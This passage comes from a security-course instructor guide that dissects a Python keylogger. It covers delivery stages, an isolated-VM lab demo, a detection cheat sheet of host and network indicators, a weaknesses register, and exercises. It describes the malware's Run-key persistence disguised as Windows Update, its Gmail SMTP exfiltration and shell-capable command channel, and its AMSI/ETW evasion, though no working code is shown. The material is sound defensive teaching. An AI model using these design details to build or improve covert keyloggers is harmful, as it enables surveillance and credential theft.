1. **It must execute in some context, and context determines capability.** Almost everything in §8 only needs **user context** — no admin, no UAC prompt. That's why user-level persistence (`HKCU`) is the default. Persistence to `HKLM`, services, or other users' profiles *does* need privilege, so malware that starts in user context either stays there or looks for an escalation.
2. **It must survive the platform's trust checks.** Mark-of-the-Web on downloads, SmartScreen, application allowlisting, macro policy, and AV scanning all sit between "file arrived" and "code ran." Notice that this repo's packaging choices (§13) are aimed almost entirely at step 2 — and the README concedes they're insufficient.
3. **It must become durable and quiet, or it's a one-shot.** Persistence + anti-analysis + exfil are all post-execution concerns. **Delivery is usually the hardest step**; once running at user level, the rest of this codebase is comparatively easy.

### The distribution reality check (make this concrete)

- Keyloggers rarely arrive alone. In the wild they're commonly **a module inside an info-stealer/loader family** — delivered as a second stage after a first-stage loader establishes persistence, or bundled with credential theft and clipboard capture.
- The **consumer-email C2** in §11 is itself a distribution-adjacent weakness: Gmail actively throttles/blocks automated SMTP from unusual clients, and a mailbox full of `[START OF LOGS]` mail is one compromised-account investigation away from full disclosure of the operation.
- **Detection shifts dramatically with vector.** Attachment vectors give you mail-gateway telemetry; trojanized-software vectors give you application-control telemetry; exposed-service vectors give you network telemetry. Ask students which they'd instrument first *given only the network diagram they have*.

### Lab demonstration (10 min, isolated VM only)

Show the **defender's view** of a delivery that stays entirely inside the VM:

1. Copy the built exe into the VM's Downloads folder.
2. Observe: no window (`console=False`), no prompt (user context).
3. Immediately check:
   - `Autoruns` → the `WindowsUpdateClient` Run entry
   - Sysmon/Event Viewer → Event 1 (process create, parent = Explorer), Event 13 (registry value set), Event 11 (file create)
   - `%TEMP%\_MEIxxxxxx\` — the PyInstaller extraction directory
   - Network: `api.ipify.org` on start, then periodic `smtp.gmail.com:465`
4. Show the tool's own trail: `%TEMP%\keylogger_logs\debug.log`, `%APPDATA%\data_cache.tmp`, `%APPDATA%\keylogger_store\`.
5. Remove it: delete the Run value, kill the process, quarantine the file, then check for resurrection (there is none in this version — worth noting, see §14f).

**Do not point any of this at a machine outside the lab.**

---

## 16. Detection cheat sheet (keep this as a handout)

### Host artifacts

| Artifact | Path / location |
|---|---|
| PyInstaller extraction dir | `%TEMP%\_MEIxxxxxx\` |
| Self-written debug log | `%TEMP%\keylogger_logs\debug.log` |
| XOR backup log | `%APPDATA%\data_cache.tmp` |
| AES log store + rotations | `%APPDATA%\keylogger_store\*.log`, `*.1.gz`–`*.5.gz` |
| Decoy file from `fake_exit()` | `%TEMP%\wuaesess.log` (empty, non-standard name) |
| Persistence | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` → `WindowsUpdateClient` → `pythonw.exe "..."` |
| Running process | `pythonw.exe` / `pykelogger.exe` with **no window** |

### Network indicators

| Signal | Why it's strong |
|---|---|
| **Non-mail-client → `smtp.gmail.com:465`** | strongest single IOC; legitimate only for mail clients |
| Non-mail-client → `imap.gmail.com:993` at a fixed cadence | beaconing |
| `GET https://api.ipify.org/` on every process start | unconditioned, immediate, unambiguous |
| Fixed 120 s intervals, no jitter | trivially caught by periodicity analysis |
| Email subject/body patterns | `[START OF LOGS]`, `[{timestamp}] ~ {window}: `, `---END OF CHUNK---`, subject `[CMD]` or `{user} - {time}` |

### Detection content to write (student deliverables)

- **YARA** — decode-first: match the base64 blobs (`c210cC5nbWFpbC5jb20=`, `U29mdHdhcmVcTWljcm9zb2Z0...`, `V2luZG93c1VwZGF0ZUNsaWVudA==`), plus the plaintext strings in the PyInstaller archive.
- **Sigma** — `registry_set` on `...\CurrentVersion\Run` where `value|contains` `WindowsUpdateClient` and `image|endswith` `pythonw.exe`; `process_create` where `image|endswith` `pythonw.exe` and `parent_image|endswith` `explorer.exe` with an empty window title.
- **Sysmon config** — at minimum events **1, 3, 7, 11, 12, 13**; add file/hash logging on `%APPDATA%` and `%TEMP%`.
- **Network** — egress allow-listing: only known mail infrastructure should speak SMTP/IMAP, and only from known mail processes.

### The one-line summary

> The tool obfuscates strings, patches telemetry, and fakes a benign exit — but it **exfiltrates over consumer email, embeds its own key, logs its own success to `%TEMP%`, and leaves a Run key named after Windows Update pointing at `pythonw.exe`.** Behavioral detection doesn't need to defeat any of the evasion techniques.

---

## 17. Weaknesses register (consolidated — use as a graded code review)

| # | Weakness | Location | Category |
|---|---|---|---|
| 1 | Static PBKDF2 salt | `crypto_utils.py:14` | crypto |
| 2 | Encryption key shipped inside the payload | `config.py:9`, `pykelogger.spec:7` | crypto |
| 3 | Silent downgrade to base64 when `cryptography` missing | `crypto_utils.py:22-28, 47` | crypto |
| 4 | Repeating-key XOR as "encryption" | `pykelogger.py:35-39` | crypto |
| 5 | Key cached in process memory | `crypto_utils.py:15, 32` | crypto |
| 6 | base64 sold as anti-AV | `obfuscation.py` | misconception |
| 7 | Persistence points at a deleted temp path | `pykelogger.py:44-47` vs `pykelogger.spec:32` | correctness |
| 8 | Race on global `logged_data` across threads | `pykelogger.py:71` vs `:151` | correctness |
| 9 | `os.path.expanduser("~").split("\\")[2]` breaks on non-standard profiles | `pykelogger.py:62` | robustness |
| 10 | Network call at import time, before any gate | `pykelogger.py:61-68` | detection |
| 11 | Debug log records its own evasion | `log_utils.py:5-6` | detection |
| 12 | Unauthenticated, one-shot, auto-deleting command channel | `c2/email.py:98-122` | design |
| 13 | Unauthenticated `shell` fallback = RAT | `c2/parser.py:25` | design |
| 14 | Four whole modules orphaned (never imported) | `evasion.py`, `keyhook.py`, `storage.py`, `c2/` | code review |
| 15 | Anti-analysis threshold causes silent false exits | `antidetect.py:190` | reliability |
| 16 | `fake_exit()` leaves a recognizable decoy | `antidetect.py:192-198` | detection |

---

## 18. Suggested exercises

1. **Decode the constants (10 min).** Decode every base64 string in `pykelogger.py:22-29` and `antidetect.py`. Produce the list of plain-text IOCs.
2. **Capture-technique comparison (lab).** Run `kky.py`, `pykelogger.py`, and the C++ build against the same typing script; quantify dropped keys and CPU use.
3. **Find the persistence bug (30 min, no hints first).** Explain why the `Run` key fails after a reboot when running the packaged exe, and cite the exact spec line responsible.
4. **Find the race (15 min).** Identify the thread-safety bug in §6a and propose two fixes; state which one guarantees no loss.
5. **Break the crypto (20 min).** Given only `data_cache.tmp` and the shipped `config.py`, recover the plaintext. Then explain what would change if the key had come from somewhere off-host.
6. **Write detection content (45 min).** One YARA rule, one Sigma rule, one Sysmon config excerpt — each targeting a different layer (file, host behavior, network).
7. **Purple-team hypothesis (§14).** Two testable "if X, then Y in Z within T" statements.
8. **Orphaned-module audit.** Prove which files are dead. Then argue: does dead offensive code change your risk assessment? (Good discussion — sometimes it indicates intent, sometimes an abandoned refactor. Forensically it matters; operationally it doesn't run.)
9. **Discussion — consent and scope.** Where's the line between parental/employee monitoring and an intrusion? What changes technically and legally? What must a legitimate deployment do differently? (Transparency, disclosure, policy, data retention limits, access controls on the collected data.)

---

## 19. Timing summary

| § | Topic | Time |
|---|---|---|
| 0 | Ground rules | 2 |
| 1–2 | Module map, level-0 version | 10 |
| 3 | Startup pipeline | 10 |
| 4 | Three capture techniques | 20 |
| 5 | Window-context enrichment | 5 |
| 6 | Buffering and exfiltration | 15 |
| 7 | Anti-analysis | 20 |
| 8 | Persistence | 5 |
| 9 | Obfuscation | 10 |
| 10 | Crypto and storage review | 15 |
| 11 | C2 channel → RAT | 15 |
| 12 | AMSI/ETW evasion + detection | 10 |
| 13 | Packaging | 5 |
| 14 | Predicted roadmap (purple team) | 20 |
| 15 | Initial access + lab demo | 20 |
| 16 | Detection cheat sheet (handout) | 5 |
| **Total** | | **~3½ h** |

Sections 17–18 are homework/lab material, not lecture time.
